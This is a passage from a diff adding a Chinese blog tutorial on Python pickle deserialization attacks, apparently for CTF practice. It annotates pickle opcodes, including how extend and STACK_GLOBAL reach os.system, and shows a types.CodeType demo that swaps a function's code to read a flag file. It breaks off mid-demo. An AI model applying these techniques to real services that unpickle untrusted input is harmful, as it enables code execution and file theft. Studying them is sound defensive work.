+</span></span><span class="line"><span class="cl"><span class="n">APPEND</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span>   <span class="c1">#先pop出栈一个变量var1,然后获取当前栈顶元素var2,执行栈顶元素的append函数,就是将一开始的栈顶元素弹出,然后又加到下一个栈顶数组中b&#34;]S&#39;S1nKk&#39;\na.&#34; =&gt; 得到[&#39;S1nKk&#39;]</span>
+</span></span><span class="line"><span class="cl"><span class="n">BUILD</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;b&#39;</span>   <span class="c1">#这个操作就是设置元素属性的操作</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 先pop出栈一个变量var1,然后获取当前栈顶元素var2,获取var2的__setstate__子成员作为var3,如果var3非空,那就执行var3(var1),这个操作正常就是通过__setstate__设置变量的属性</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 但是上面的var3为空也有别的处理:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 1.检查var1是否为tuple类型且长度为2,如果是的话那就将其分别赋值为state,slotstate</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 2.检查state是否为空,如果不为空尝试取出state.items()然后使用k,v键值对的方式便利,最后通过修改var2.__dict__的方式修改var2的属性,也就是使得var2[k]=v,var2.k=v</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 3.检查slotstate是否为空,如果不为空和第2步一样,取出slotstate.items()通过k,v键值对方式遍历,然后使用setattr方法设置var2属性,最后效果也是var2[k]=v,var2.k=v</span>
+</span></span><span class="line"><span class="cl"><span class="n">GLOBAL</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;c&#39;</span>   <span class="c1">#导入一个模块,首先读取当前行后面的全部内容适应utf-8解码得到的字符串作为module,然后再读出下一行的内容同样解析出字符串作为那么,最后导入module.name这个包</span>
+</span></span><span class="line"><span class="cl"><span class="n">DICT</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;d&#39;</span>   <span class="c1">#将栈中的数据弹出到上一个Mark为止,然后按照key:value的方式逐个解析然后放入到一个字典中,将最后得到的字典压栈b&#34;(S&#39;key1&#39;\nS&#39;val1&#39;\nS&#39;key2&#39;\nS&#39;val2&#39;\nd.&#34; =&gt; {&#39;key1&#39;: &#39;val1&#39;, &#39;key2&#39;: &#39;val2&#39;}</span>
+</span></span><span class="line"><span class="cl"><span class="n">EMPTY_DICT</span>     <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;}&#39;</span>   <span class="c1">#没什么好说的,就是往栈中压入一个空字典</span>
+</span></span><span class="line"><span class="cl"><span class="n">APPENDS</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;e&#39;</span>   <span class="c1">#先将栈中元素不断弹出知道Mark标记,然后将弹出的全部元素放入items中,再取出栈顶作为list_obj,之后执行下面两步操作:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 1.先取出extend=list_obj.extend,然后执行extend(items)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 2.取出append = list_obj.append,然后使用for循环遍历items得到item,然后每次循环都执行一次append(item)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 看到这里应该想到函数触发的方法,我们只需要使用b操作将list_obj的extend改为一个危险的函数方法,然后再让参数进入items,就可以通过extend(items)的方式调用任意构造的危险函数了</span>
+</span></span><span class="line"><span class="cl"><span class="n">GET</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;g&#39;</span>   <span class="c1">#读取后面的全部本行数据,然后转为int类型放入变量i中,使用i作为索引,从缓存区取出数据mem[i],然后将这个从缓存中取出的变量压栈</span>
+</span></span><span class="line"><span class="cl"><span class="n">BINGET</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;h&#39;</span>   <span class="c1">#后面读取一个字节的数据,然后使用字符16进制大小作为下标索引,从缓存mem中读数据,将读出的内容压栈,下面就是一个获取缓存中下标为1的数据的实例b&#34;S&#39;h0cksr&#39;\np1\nS&#39;t&#39;\n0h\x01.&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">INST</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;i&#39;</span>   <span class="c1">#两次pop出栈读出数据并且均进行解码操作使其变为字符串格式,</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 1. 第一第二次弹出的数据分别放入module和name中,先导入moudle模块,然后name通过.逐个获取出里面的子成员,最后返回目标子成员(可能是函数也可能是类或变量)var1</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 2. 继续进行出栈,直到遇到Mark标志,将出栈的数据作为参数,var1位方法,执行var1(Mark弹出数据)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 3. 将生成的实例化对象压栈</span>
+</span></span><span class="line"><span class="cl"><span class="n">LONG_BINGET</span>    <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;j&#39;</span>   <span class="c1">#先读出4字节大小数据流,然后通过unpack使用&lt;I格式解压得到int类型数据i,将i作为下标,从缓存中获取变量mem[i],将获取到的数据压栈</span>
+</span></span><span class="line"><span class="cl"><span class="n">LIST</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;l&#39;</span>   <span class="c1">#将上一次Mark之后的数据全部弹出,并且将其存放到一个数组中,然后在将这个数组压栈b&#34;(S&#39;S1nKk&#39;\np1\nS&#39;t&#39;\nl.&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">EMPTY_LIST</span>     <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;]&#39;</span>   <span class="c1">#没什么好说,往栈中压入一个空数组</span>
+</span></span><span class="line"><span class="cl"><span class="n">OBJ</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;o&#39;</span>   <span class="c1">#先是将上一次Mark之后的数据全部弹出,得到一个数组var1,然后又在var1中pop取出最后一个数据作为var2,之后执行以下过程:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 1.检查弹出数据后的var1数组是否为空,如果var1非空,或者弹出的var2属于type类型,或者弹出的var2有__getinitargs__属性成员,那么就会执行var2(var1)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 2.如果以上条件均不满足,那就执行var2.__new__(var2)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 3.将执行结果压入栈中</span>
+</span></span><span class="line"><span class="cl"><span class="n">PUT</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;p&#39;</span>   <span class="c1">#读取后面全部当前行的数据,然后转为int类型的变量i,然后赋值当前栈顶元素存到memo[i]中</span>
+</span></span><span class="line"><span class="cl"><span class="n">BINPUT</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;q&#39;</span>   <span class="c1">#和上一个一样,不同的是下标i是通过读取1个字节的数据,然后直接当做下标</span>
+</span></span><span class="line"><span class="cl"><span class="n">LONG_BINPUT</span>    <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;r&#39;</span>   <span class="c1">#和上一个一样,不同的是下标i是通过读取4个字节的数据,然后通过unpack使用&lt;I模式解压得到的整数当做下标</span>
+</span></span><span class="line"><span class="cl"><span class="n">SETITEM</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;s&#39;</span>   <span class="c1">#先在栈中pop弹出第一个数据作为value,然后在pop弹出第二个元素作为key,再获取当前栈顶元素记为dict,给栈顶元素赋值dict[key]=value</span>
+</span></span><span class="line"><span class="cl"><span class="n">TUPLE</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;t&#39;</span>   <span class="c1">#弹出上一次Mark之后的全部数据大农一个list数组中,然后使用tuple函数将其转为元组格式再把这个元组压入栈中</span>
+</span></span><span class="line"><span class="cl"><span class="n">EMPTY_TUPLE</span>    <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;)&#39;</span>   <span class="c1">#没什么好说,往栈中压入一个空元组</span>
+</span></span><span class="line"><span class="cl"><span class="n">SETITEMS</span>       <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;u&#39;</span>   <span class="c1">#先弹出上一次Mark之后的全部元素放入一个数组items中,然后获取栈顶元素记为dict,通过i=0,2,3...获取items中的数据,执行dict[items[i]] = items[i + 1]给栈顶的字典元素添加键值对</span>
+</span></span><span class="line"><span class="cl"><span class="n">BINFLOAT</span>       <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;G&#39;</span>   <span class="c1">#先读取8字节数据,然后使用unpack通过&lt;d格式的解压,将得到的float数据压栈</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">TRUE</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;I01</span><span class="se">\n</span><span class="s1">&#39;</span>  <span class="c1"># not an opcode; see INT docs in pickletools.py</span>
+</span></span><span class="line"><span class="cl"><span class="n">FALSE</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;I00</span><span class="se">\n</span><span class="s1">&#39;</span>  <span class="c1"># not an opcode; see INT docs in pickletools.py</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Protocol 2</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">PROTO</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x80</span><span class="s1">&#39;</span>  <span class="c1">#用于声明pickle协议版本</span>
+</span></span><span class="line"><span class="cl"><span class="n">NEWOBJ</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x81</span><span class="s1">&#39;</span><span class="c1">#(这个很有用)  #从栈中弹出两次变量,第一次弹出的变量记为var1,第二次弹出的变量记为var2,然后就会通过cls.__new__(var2, *var1)生成实例化对象,然后将生成的对象压栈</span>
+</span></span><span class="line"><span class="cl"><span class="n">EXT1</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x82</span><span class="s1">&#39;</span>  <span class="c1">#&#39;&#39;&#39;\x82,\x83,\x84这三个操作都是和extension registry扩展注册表有关的,但是拓展注册表主要维护4个从copyreg导入的映射字典</span>
+</span></span><span class="line"><span class="cl"><span class="n">EXT2</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x83</span><span class="s1">&#39;</span>  <span class="c1">#     dispatch_tablecopyreg, _extension_registry, _inverted_registry, _extension_cache</span>
+</span></span><span class="line"><span class="cl"><span class="n">EXT4</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x84</span><span class="s1">&#39;</span>  <span class="c1">#     但是从头到尾貌似这几个核心表单都没有发生过变化(也可能是我没注意到而已)&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">TUPLE1</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x85</span><span class="s1">&#39;</span>  <span class="c1">#将栈顶元素弹出放到一个元组中再将这个元组压栈,就是将栈顶放到一个元组里面的作用b&#34;S&#39;S1nk&#39;\n\x85.&#34; =&gt; (&#39;S1nk&#39;,)</span>
+</span></span><span class="line"><span class="cl"><span class="n">TUPLE2</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x86</span><span class="s1">&#39;</span>  <span class="c1">#将栈顶的两个元素弹出,栈顶弹出为var1,继续弹出一个为var2,然后组成一个元组然后将这个元组压栈,得到(var2,var1),b&#34;S&#39;S1nk&#39;\nS&#39;S1nKk&#39;\n\x86.&#34; =&gt; (&#39;S1nk&#39;, &#39;S1nKk&#39;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">TUPLE3</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x87</span><span class="s1">&#39;</span>  <span class="c1">#和上面一样,不够该操作是弹出三个元素形成元组b&#34;S&#39;S1nK&#39;\nS&#39;S11nK&#39;\nS&#39;S111nK&#39;\n\x87.&#34; =&gt; (&#39;S1nK&#39;, &#39;S11nK&#39;, &#39;S111nk&#39;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">NEWTRUE</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x88</span><span class="s1">&#39;</span>  <span class="c1">#向栈中压入一个True</span>
+</span></span><span class="line"><span class="cl"><span class="n">NEWFALSE</span>       <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x89</span><span class="s1">&#39;</span>  <span class="c1">#向栈中压入一个False</span>
+</span></span><span class="line"><span class="cl"><span class="n">LONG1</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x8a</span><span class="s1">&#39;</span>  <span class="c1">#先读取一个字节,以该字节16进制数为大小size,从后面的数据读取size个字节,然后将读取到的数据转为long类型</span>
+</span></span><span class="line"><span class="cl"><span class="n">LONG4</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x8b</span><span class="s1">&#39;</span>  <span class="c1">#读取4字节数据,通过unpack的&lt;i格式将数据解压得到一个整数,以这个整数为字节大小读取后面的数据</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">_tuplesize2code</span> <span class="o">=</span> <span class="p">[</span><span class="n">EMPTY_TUPLE</span><span class="p">,</span> <span class="n">TUPLE1</span><span class="p">,</span> <span class="n">TUPLE2</span><span class="p">,</span> <span class="n">TUPLE3</span><span class="p">]</span><span class="c1">#就是元组操作合集,分别是向栈中压入空数组,将最后1个元素放入元组后将元组压栈,将最后2个元素放入元组后将元组压栈,将最后3个元素放入元组后将元组压栈</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Protocol 3 (Python 3.x)#这里要注意一下,后面的操作是有python3方才支持</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">BINBYTES</span>       <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span>   <span class="c1">#先读取4字节数据通过unpack使用&lt;i格式将数据解压,将得到的结果作为大小向后读取相应字节数,然后将读取到的全部字节压栈,注意一下,压栈的是原始的比特流数据b&#39;B\x06\x00\x00\x00h0cksr.&#39; =&gt; b&#39;h0cksr&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">SHORT_BINBYTES</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;C&#39;</span>   <span class="c1">#读取一个字节,以它的16进制数作为大小向后读取对应字节的数据b&#39;C\x06h0cksr.&#39; =&gt; b&#39;S1nKk&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Protocol 4</span>
+</span></span><span class="line"><span class="cl"><span class="n">SHORT_BINUNICODE</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x8c</span><span class="s1">&#39;</span>  <span class="c1">#先读取一个字节,以这个字节的16进制为大小向后读取对应字节的数据,然后使用utf-8的格式解码数据为字符串格式,然后将这个字符串压栈b&#39;\x8c\x06S1nKk.&#39; =&gt; S1nKk</span>
+</span></span><span class="line"><span class="cl"><span class="n">BINUNICODE8</span>      <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x8d</span><span class="s1">&#39;</span>  <span class="c1">#先读取8字节数据然后通过unpack使用&lt;Q格式解压数据,将得到的结果作为大小向后读取相应字节数,然后将读取到的数据使用utf-8格式解压为字符串,将字符串压栈b&#39;\x8d\x06\x00\x00\x00\x00\x00\x00\x00h0cksr.&#39; =&gt; h0cksr</span>
+</span></span><span class="line"><span class="cl"><span class="n">BINBYTES8</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x8e</span><span class="s1">&#39;</span>  <span class="c1">#同上读取8字节数据&lt;Q格式解压,然后读取数据,但是直接将比特流数据压栈而不会解码b&#39;\x8e\x06\x00\x00\x00\x00\x00\x00\x00S1nKk.&#39; =&gt; b&#39;S1nKk&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">EMPTY_SET</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x8f</span><span class="s1">&#39;</span>  <span class="c1">#向栈中压入一个set类型的空集合(set()没有指定iterable的时候返回的是一个空集合)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ADDITEMS</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span>  <span class="c1">#先pop弹出一个元素作为items,记栈顶元素为top,然后检查top是否为set类型,如果是的话就执行top.update(items),如果top不是set类型那就使用for遍历items,逐个执行top.add(item)</span>
+</span></span><span class="line"><span class="cl"><span class="n">FROZENSET</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x91</span><span class="s1">&#39;</span>  <span class="c1">#弹出栈顶元素作为items,然后执行frozenset(items)生成一个frozenset类型的变量,并将这个变量压栈</span>
+</span></span><span class="line"><span class="cl"><span class="n">NEWOBJ_EX</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x92</span><span class="s1">&#39;</span><span class="c1">#(这个很有用)  #和NEWOBJ差不多,先从栈中弹出三个元素,第一个,第二个,第三个弹出的元素分别记为var1,var2,var3,然后执行cls.__new__(var3, *var2, **var1)之后将执行生成的对象压栈</span>
+</span></span><span class="line"><span class="cl"><span class="n">STACK_GLOBAL</span>     <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x93</span><span class="s1">&#39;</span><span class="c1">#(这个很有用)  #和GLOBAL操作一样但是导入的模块从栈上获取,先弹出一个元素为name,然后再弹出一个元素moudle,要求两个元素都必须是字符串类型,然后到处moudle.name,在将导出的内容压栈b&#34;S&#39;os&#39;\nS&#39;system&#39;\n\x93.&#34; =&gt; os.system</span>
+</span></span><span class="line"><span class="cl"><span class="n">MEMOIZE</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x94</span><span class="s1">&#39;</span>  <span class="c1">#将当前栈顶元素添加到缓存列表的末尾(注意栈顶不会弹出)</span>
+</span></span><span class="line"><span class="cl"><span class="n">FRAME</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x95</span><span class="s1">&#39;</span>  <span class="c1">#后面先是读取8字节数据通过unpack使用&lt;Q格式将数据解压得到的结果作为大小,向后读取对应字节的数据,然后将读取到的数据进行正常pickle反序列化(感觉用不用这个操作没啥差别,但是细节差别的话看源码)</span>
+</span></span></code></pre></div><p>好，正片开始</p>
+<h3 id="小demo">小demo<a hidden class="anchor" aria-hidden="true" href="#小demo">#</a></h3>
+<p>看完上面现在是处于看得懂序列化数据的了</p>
+<p>然后看到参考文章中两个变量覆盖的demo，这个不止可以变量覆盖，可以用来我们<code>验证手搓反序列化</code>，后面会用到</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Student</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">age</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">age</span> <span class="o">=</span> <span class="n">age</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">data</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;&#39;&#39;c__main__
+</span></span></span><span class="line"><span class="cl"><span class="s1">Student
+</span></span></span><span class="line"><span class="cl"><span class="s1">(S&#39;XiaoMing&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#34;20&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">tR.&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">a</span><span class="o">=</span><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="o">.</span><span class="n">name</span><span class="p">,</span><span class="n">a</span><span class="o">.</span><span class="n">age</span><span class="p">)</span>
+</span></span></code></pre></div><h2 id="typescodetype">types.CodeType<a hidden class="anchor" aria-hidden="true" href="#typescodetype">#</a></h2>
+<p>这里也可以先看例题，然后回来看这里</p>
+<p>我们还需要知道这个知识点，这个函数是python用来<code>动态修改函数</code>，感觉<code>利用点还不错</code>有待开发利用，有点类似<code>java agent后代理</code>那种感觉</p>
+<p>这里可以先构造恶意函数，for出<code>__code__</code>对应的值，然后去覆盖我们目标函数，使其变成我们的恶意函数进行利用</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">src</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span>  <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;app.py&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">,</span><span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="vm">__code__</span><span class="o">.</span><span class="fm">__dir__</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2"> : </span><span class="si">{</span><span class="nb">getattr</span><span class="p">(</span><span class="n">src</span><span class="o">.</span><span class="vm">__code__</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p><img loading="lazy" src="images/image-20241230160110695.png" alt="image-20241230160110695"  />
+</p>
+<p>看下面这个demo，将src的<code>__code__</code>覆盖给<code>secret()</code>,覆盖过程中做了个小修改，将src()中&rsquo;<code>app.py</code>&lsquo;改成&rsquo;<code>flag</code>&rsquo;（这里其实恶意函数可以写好，不用改的，这里懒得重新写demo了就直接用了hhh）,最后成功读取<code>flag</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">types</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">src</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span>  <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;app.py&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">,</span><span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">secret</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">oCode</span> <span class="o">=</span> <span class="n">src</span><span class="o">.</span><span class="vm">__code__</span>
+</span></span><span class="line"><span class="cl"><span class="n">secret</span><span class="o">.</span><span class="vm">__code__</span><span class="o">=</span> <span class="n">types</span><span class="o">.</span><span class="n">CodeType</span><span class="p">(</span><span class="n">oCode</span><span class="o">.</span><span class="n">co_argcount</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                                <span class="n">oCode</span><span class="o">.</span><span class="n">co_posonlyargcount</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                                <span class="n">oCode</span><span class="o">.</span><span class="n">co_kwonlyargcount</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                                <span class="n">oCode</span><span class="o">.</span><span class="n">co_nlocals</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                                <span class="n">oCode</span><span class="o">.</span><span class="n">co_stacksize</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                                <span class="n">oCode</span><span class="o">.</span><span class="n">co_flags</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">oCode</span><span class="o">.</span><span class="n">co_code</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                                <span class="nb">tuple</span><span class="p">(</span><span class="n">c</span> <span class="k">if</span> <span class="n">c</span> <span class="o">!=</span> <span class="s1">&#39;app.py&#39;</span> <span class="k">else</span> <span class="s1">&#39;flag&#39;</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">oCode</span><span class="o">.</span><span class="n">co_consts</span><span class="p">),</span> 
+</span></span><span class="line"><span class="cl">                                <span class="n">oCode</span><span class="o">.</span><span class="n">co_names</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                                <span class="n">oCode</span><span class="o">.</span><span class="n">co_varnames</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">oCode</span><span class="o">.</span><span class="n">co_filename</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">oCode</span><span class="o">.</span><span class="n">co_name</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                                <span class="n">oCode</span><span class="o">.</span><span class="n">co_firstlineno</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                                <span class="n">oCode</span><span class="o">.</span><span class="n">co_lnotab</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">oCode</span><span class="o">.</span><span class="n">co_freevars</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">oCode</span><span class="o">.</span><span class="n">co_cellvars</span><span class="p">,)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">secret</span><span class="p">())</span>
+</span></span></code></pre></div><p>下面这个demo是为了pickle反序列化做铺垫的</p>
+<h3 id="pickle-demo">pickle demo<a hidden class="anchor" aria-hidden="true" href="#pickle-demo">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">builtins</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">types</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">src</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span>  <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;app.py&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">,</span><span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="vm">__code__</span><span class="o">.</span><span class="fm">__dir__</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2"> : </span><span class="si">{</span><span class="nb">getattr</span><span class="p">(</span><span class="n">src</span><span class="o">.</span><span class="vm">__code__</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">g1</span> <span class="o">=</span> <span class="n">builtins</span><span class="o">.</span><span class="n">getattr</span>
+</span></span><span class="line"><span class="cl"><span class="n">g2</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">src</span><span class="p">,</span><span class="s2">&#34;__code__&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">g3</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">g2</span><span class="p">,</span><span class="s2">&#34;co_argcount&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">g4</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">g2</span><span class="p">,</span><span class="s2">&#34;co_posonlyargcount&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">g5</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">g2</span><span class="p">,</span><span class="s2">&#34;co_kwonlyargcount&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">g6</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">g2</span><span class="p">,</span><span class="s2">&#34;co_nlocals&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">g7</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">g2</span><span class="p">,</span><span class="s2">&#34;co_stacksize&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">g8</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">g2</span><span class="p">,</span><span class="s2">&#34;co_flags&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">g9</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">g2</span><span class="p">,</span><span class="s2">&#34;co_code&#34;</span><span class="p">)</span>
